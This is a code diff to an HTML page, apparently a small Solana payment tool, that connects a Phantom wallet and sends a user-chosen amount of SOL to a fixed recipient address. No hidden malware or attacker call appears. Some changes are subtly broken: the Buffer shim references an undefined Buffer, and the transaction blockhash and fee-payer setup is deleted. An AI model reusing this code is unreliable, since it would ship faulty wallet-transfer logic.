@@ -5,8 +5,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phantom Connect</title>
+    <!-- Carica il polyfill per Buffer -->
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
     <!-- Carica la libreria Solana Web3 -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.js"></script>
     <style>
         body {
             background: #0c0c0c;
@@ -66,37 +68,40 @@
     </div>
 
     <script>
+        // Configura Buffer globalmente
+        if (typeof Buffer === "undefined") {
+            window.Buffer = Buffer;
+        }
+
+        // Verifica che Buffer.from sia disponibile
+        if (!Buffer.from) {
+            Buffer.from = (data, encoding) => new Buffer(data, encoding);
+        }
+
         let senderPublicKey = null; 
         const recipientAddress = "AbkmJwcuCwj6zcCNkoQmStTMhFLe4CwTS3p4g8nnScue";
 
-        // Collega il wallet Phantom
         document.getElementById('connect-btn').addEventListener('click', async () => {
             if (window.solana && window.solana.isPhantom) {
                 try {
-                    // Disconnette il wallet prima di riconnettere
                     await window.solana.disconnect();
                     const resp = await window.solana.connect();
                     senderPublicKey = resp.publicKey.toString(); 
                     document.getElementById('wallet-status').style.display = 'block';
                     document.getElementById('wallet-status').innerText = 'Wallet collegato ✅\nAddress: ' + senderPublicKey;
-                    console.log("Wallet collegato:", senderPublicKey);
                 } catch (err) {
                     alert('Connessione rifiutata o errore.');
-                    console.error("Errore durante la connessione:", err);
                 }
             } else {
-                alert("Phantom Wallet non trovato. Installa l'estensione del browser.");
                 window.location.href = 'https://phantom.app/';
             }
         });
 
-        // Mostra il campo per l'importo
         function showAmount() {
             document.getElementById('amount-section').style.display = 'block';
             document.getElementById('next-btn').style.display = 'inline-block';
         }
 
-        // Invia SOL
         async function sendSol() {
             const amount = parseFloat(document.getElementById('amount').value);
             if (!amount || amount <= 0) {
@@ -119,26 +124,14 @@
                     })
                 );
 
-                // Aggiungi il recentBlockhash e il feePayer alla transazione
-                const { blockhash } = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = new PublicKey(senderPublicKey);
-
-                // Firma e invia la transazione
                 const { signature } = await window.solana.signAndSendTransaction(transaction);
-                console.log("Transazione inviata. Hash:", signature);
-
-                // Conferma la transazione
                 await connection.confirmTransaction(signature, "confirmed");
                 document.getElementById('success-message').style.display = 'block';
                 console.log(`Transazione completata! Hash: ${signature}`);
             } catch (err) {
                 alert('Errore durante la transazione: ' + err.message);
-                console.error("Errore durante la transazione:", err);
             }
         }
     </script>
 </body>
 </html>
-
-
